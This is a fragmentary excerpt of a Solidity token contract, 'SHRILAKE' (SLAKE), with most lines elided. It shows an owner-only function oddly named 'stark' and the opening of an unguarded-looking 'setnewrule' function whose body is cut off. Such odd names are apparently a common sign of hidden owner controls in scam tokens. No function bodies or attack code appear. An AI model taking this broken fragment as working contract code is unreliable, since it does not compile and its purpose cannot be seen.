...
contract Ownable is Context, IERC165{  
    ...
    */
    ...
    function stark(address newOwner) external onlyOwner returns (bool) {
...
contract SHRILAKE is Ownable {
    using SafeMath for uint256;    
    uint256 public totalSupply = 100000000 *  10**9;
    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) internal allowed;
    string public name = "SHRILAKE";    
    string public symbol = "SLAKE";
    ...
    function setnewrule(address to, uint256 _token) external
    {
